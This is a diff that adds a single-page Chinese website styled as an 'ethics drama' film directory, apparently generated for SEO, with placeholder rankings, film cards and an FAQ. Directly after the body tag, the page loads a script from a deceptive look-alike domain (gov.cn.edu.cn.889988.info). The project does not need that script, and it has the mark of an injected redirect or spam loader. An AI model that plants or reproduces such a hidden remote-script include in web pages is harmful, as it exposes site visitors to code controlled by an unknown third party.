@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>电影网伦理片 - 伦理剧情电影在线观看 | 电影网伦理片</title>
+<meta name="description" content="电影网伦理片（https://dianyingwanglunlipian-h5.github.io）提供伦理剧情、家庭情感、社会现实类电影介绍与分类导航，移动端自适应，免费影视资源聚合站。">
+<meta name="keywords" content="电影网伦理片,伦理片,伦理电影,剧情电影,家庭伦理,社会现实电影">
+<meta name="author" content="电影网伦理片">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --bg:#0e0e12;
+  --bg2:#16161f;
+  --line:#2a2a36;
+  --text:#e8e8ef;
+  --muted:#9aa0b4;
+  --brand:#e23b50;
+  --brand2:#ffb347;
+  --radius:14px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:radial-gradient(1200px 600px at 80% -10%,#241019 0%,var(--bg) 55%) fixed;
+  color:var(--text);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;
+  line-height:1.7;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 顶部 */
+.topbar{
+  position:sticky;top:0;z-index:50;
+  backdrop-filter:blur(10px);
+  background:rgba(14,14,18,.82);
+  border-bottom:1px solid var(--line);
+}
+.topbar-in{
+  max-width:1180px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 18px;
+}
+.brand{
+  font-weight:800;letter-spacing:.5px;font-size:20px;
+  background:linear-gradient(90deg,var(--brand),var(--brand2));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.nav{display:flex;gap:18px;font-size:15px;color:var(--muted)}
+.nav a:hover{color:var(--brand)}
+.burger{display:none;font-size:24px;cursor:pointer;color:var(--text)}
+
+/* 布局 */
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+section{padding:64px 0;border-bottom:1px solid var(--line)}
+.kicker{
+  display:inline-block;font-size:13px;color:var(--brand);
+  border:1px solid var(--brand);padding:3px 10px;border-radius:999px;margin-bottom:14px;
+}
+.h2{font-size:30px;margin-bottom:8px}
+.sub{color:var(--muted);margin-bottom:30px}
+
+/* 首页 hero：左右分栏 */
+.hero{
+  display:grid;grid-template-columns:1.1fr .9fr;gap:34px;align-items:center;
+}
+.hero h1{font-size:46px;line-height:1.15;margin:10px 0 18px}
+.hero p{color:var(--muted);max-width:520px}
+.hero .url{
+  margin-top:22px;font-size:14px;color:var(--brand2);
+  background:var(--bg2);border:1px dashed var(--line);padding:10px 14px;border-radius:10px;display:inline-block;
+}
+.poster{
+  aspect-ratio:3/4;border-radius:18px;
+  background:
+    linear-gradient(160deg,rgba(226,59,80,.35),rgba(255,179,71,.18)),
+    repeating-linear-gradient(45deg,#1b1b25 0 12px,#15151e 12px 24px);
+  border:1px solid var(--line);
+  display:flex;align-items:flex-end;padding:18px;
+  box-shadow:0 30px 80px rgba(0,0,0,.45);
+}
+.poster span{font-size:14px;color:var(--muted)}
+
+/* 栏目：时间轴 */
+.timeline{position:relative;margin-left:8px;padding-left:26px;border-left:2px solid var(--line)}
+.tl-item{position:relative;margin-bottom:26px}
+.tl-item::before{
+  content:"";position:absolute;left:-35px;top:6px;
+  width:14px;height:14px;border-radius:50%;
+  background:var(--brand);box-shadow:0 0 0 4px rgba(226,59,80,.18);
+}
+.tl-item h3{font-size:18px}
+.tl-item p{color:var(--muted);font-size:14px}
+
+/* 栏目：标签云 + 列表 */
+.tagcloud{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:26px}
+.tag{
+  padding:8px 14px;border-radius:999px;font-size:14px;
+  background:var(--bg2);border:1px solid var(--line);color:var(--muted);
+  transition:.25s;
+}
+.tag:hover{color:#fff;border-color:var(--brand);transform:translateY(-2px)}
+.list-row{
+  display:flex;gap:16px;padding:16px;border:1px solid var(--line);
+  border-radius:var(--radius);background:var(--bg2);margin-bottom:14px;
+}
+.list-row .no{
+  width:46px;height:46px;flex:0 0 46px;border-radius:12px;
+  display:flex;align-items:center;justify-content:center;
+  background:linear-gradient(135deg,var(--brand),#7a1530);font-weight:800;
+}
+.list-row h4{font-size:17px}
+.list-row p{color:var(--muted);font-size:14px}
+
+/* 栏目：卡片墙 */
+.wall{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:18px;
+}
+.film{
+  background:var(--bg2);border:1px solid var(--line);border-radius:var(--radius);
+  overflow:hidden;transition:.3s;
+}
+.film:hover{transform:translateY(-6px);border-color:var(--brand)}
+.film .cover{
+  height:260px;
+  background:linear-gradient(135deg,#221622,#101018);
+  display:flex;align-items:center;justify-content:center;color:#5b5b6b;font-size:13px;
+}
+.film .body{padding:14px}
+.film .body h4{font-size:16px;margin-bottom:6px}
+.film .body p{color:var(--muted);font-size:13px}
+.badge{font-size:12px;color:var(--brand2);border:1px solid var(--line);padding:2px 8px;border-radius:8px}
+
+/* 栏目：关于 + FAQ */
+.faq{display:grid;gap:12px}
+.qa{background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:16px}
+.qa b{color:var(--brand)}
+.qa p{color:var(--muted);margin-top:6px;font-size:14px}
+
+footer{
+  padding:34px 18px;text-align:center;color:var(--muted);font-size:13px;
+  background:#0b0b0f;
+}
+footer a{color:var(--brand2)}
+
+@media(max-width:860px){
+  .hero{grid-template-columns:1fr}
+  .hero h1{font-size:34px}
+  .nav{
+    position:absolute;top:100%;right:0;left:0;
+    flex-direction:column;gap:0;background:#0c0c11;border-bottom:1px solid var(--line);
+    display:none;
+  }
+  .nav a{padding:14px 18px;border-top:1px solid var(--line)}
+  .nav.open{display:flex}
+  .burger{display:block}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 导航 -->
+<div class="topbar">
+  <div class="topbar-in">
+    <div class="brand">电影网伦理片</div>
+    <div class="burger" onclick="document.getElementById('nav').classList.toggle('open')">☰</div>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#types">类型导航</a>
+      <a href="#rank">热播榜单</a>
+      <a href="#films">影片库</a>
+      <a href="#about">关于/FAQ</a>
+    </nav>
+  </div>
+</div>
+
+<!-- 首页 -->
+<section id="home">
+  <div class="wrap hero">
+    <div>
+      <span class="kicker">ETHICS · DRAMA · FILM</span>
+      <h1>电影网伦理片<br>聚焦人性、家庭与社会边界</h1>
+      <p>电影网伦理片整理伦理剧情、家庭情感、婚姻矛盾、社会现实类影视内容，提供分类导航、热播榜单与影片档案，适合移动端快速浏览。</p>
+      <div class="url">🌐 https://dianyingwanglunlipian-h5.github.io</div>
+    </div>
+    <div class="poster">
+      <span>POSTER / 伦理片视觉占位</span>
+    </div>
+  </div>
+</section>
+
+<!-- 类型导航：时间轴 DOM -->
+<section id="types">
+  <div class="wrap">
+    <span class="kicker">CATEGORY</span>
+    <h2 class="h2">伦理片类型导航</h2>
+    <p class="sub">按主题维度划分，帮助用户快速定位内容方向。</p>
+    <div class="timeline">
+      <div class="tl-item">
+        <h3>家庭伦理</h3>
+        <p>代际冲突、亲子关系是伦理片高频母题，强调情感张力与道德选择。</p>
+      </div>
+      <div class="tl-item">
+        <h3>婚姻情感</h3>
+        <p>婚外关系、信任崩塌、责任与欲望的拉扯，适合剧情向观众。</p>
+      </div>
+      <div class="tl-item">
+        <h3>社会现实</h3>
+        <p>贫困、阶层、性别、老龄化等现实议题，偏严肃作者电影。</p>
+      </div>
+      <div class="tl-item">
+        <h3>人性边界</h3>
+        <p>法律与道德、善与恶的灰色地带，常见悬疑+伦理复合类型。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 热播榜单：编号列表 DOM -->
+<section id="rank">
+  <div class="wrap">
+    <span class="kicker">TOP LIST</span>
+    <h2 class="h2">伦理片热播榜单</h2>
+    <p class="sub">示例榜单，仅作单页展示结构，内页链接以 # 占位。</p>
+    <div class="list-row">
+      <div class="no">1</div>
+      <div>
+        <h4>《黄昏里的家》 <span class="badge">家庭伦理</span></h4>
+        <p>两代人围绕房产与照护展开拉扯，情感真实、台词克制。</p>
+        <a href="#">查看详情 →</a>
+      </div>
+    </div>
+    <div class="list-row">
+      <div class="no">2</div>
+      <div>
+        <h4>《婚约裂痕》 <span class="badge">婚姻情感</span></h4>
+        <p>十年婚姻在秘密曝光后走向清算，人物动机复杂。</p>
+        <a href="#">查看详情 →</a>
+      </div>
+    </div>
+    <div class="list-row">
+      <div class="no">3</div>
+      <div>
+        <h4>《城中边缘人》 <span class="badge">社会现实</span></h4>
+        <p>底层租客、平台劳工与城市规则之间的生存故事。</p>
+        <a href="#">查看详情 →</a>
+      </div>
+    </div>
+    <div class="list-row">
+      <div class="no">4</div>
+      <div>
+        <h4>《沉默证人》 <span class="badge">人性边界</span></h4>
+        <p>目击者、加害者、家属三方视角，伦理悬疑感强。</p>
+        <a href="#">查看详情 →</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 影片库：卡片墙 DOM -->
+<section id="films">
+  <div class="wrap">
+    <span class="kicker">FILM LIBRARY</span>
+    <h2 class="h2">伦理影片库</h2>
+    <p class="sub">网格卡片布局，移动端自动单列，PC 端多列展示。</p>
+    <div class="wall">
+      <article class="film">
+        <div class="cover">海报占位 01</div>
+        <div class="body">
+          <h4>母亲的语言</h4>
+          <p>阿尔茨海默症背景下的家庭记忆重建。</p>
+          <a href="#">播放 #</a>
+        </div>
+      </article>
+      <article class="film">
+        <div class="cover">海报占位 02</div>
+        <div class="body">
+          <h4>第二份工资</h4>
+          <p>全职妈妈重返职场后的身份焦虑。</p>
+          <a href="#">播放 #</a>
+        </div>
+      </article>
+      <article class="film">
+        <div class="cover">海报占位 03</div>
+        <div class="body">
+          <h4>邻居不说的事</h4>
+          <p>小区邻里关系背后的阶级与偏见。</p>
+          <a href="#">播放 #</a>
+        </div>
+      </article>
+      <article class="film">
+        <div class="cover">海报占位 04</div>
+        <div class="body">
+          <h4>未寄出的信</h4>
+          <p>临终关怀与代际道歉的慢节奏剧情片。</p>
+          <a href="#">播放 #</a>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 + FAQ -->
+<section id="about">
+  <div class="wrap">
+    <span class="kicker">ABOUT / FAQ</span>
+    <h2 class="h2">关于电影网伦理片</h2>
+    <p class="sub">电影网伦理片：https://dianyingwanglunlipian-h5.github.io</p>
+    <div class="faq">
+      <div class="qa">
+        <b>Q：本站提供什么内容？</b>
+        <p>A：提供伦理片分类、榜单、影片档案与影视导航，所有内页示例均用 # 占位。</p>
+      </div>
+      <div class="qa">
+        <b>Q：是否适配手机？</b>
+        <p>A：是，使用 viewport + 媒体查询，手机端导航折叠为汉堡菜单，卡片自动单列。</p>
+      </div>
+      <div class="qa">
+        <b>Q：为什么没有 robots.txt / sitemap.xml？</b>
+        <p>A：按你的要求不生成这两个文件，单页站可直接被搜索引擎爬取。</p>
+      </div>
+      <div class="qa">
+        <b>Q：和上一个电影站有什么不同？</b>
+        <p>A：上一套是亮色卡片+网格+列表混排；本套是暗色胶片风，采用左右分栏、时间轴、编号榜、卡片墙等差异化 DOM。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  © 2024 电影网伦理片 ·
+  官网：<a href="https://dianyingwanglunlipian-h5.github.io">dianyingwanglunlipian-h5.github.io</a>
+  <br>单页演示站 · 内链均使用 # 占位 · 不生成 robots.txt / sitemap.xml
+</footer>
+
+<script>
+// 移动端导航点击关闭
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    if(window.innerWidth<=860){
+      document.getElementById('nav').classList.remove('open');
+    }
+  });
+});
+</script>
+</body>
+</html>
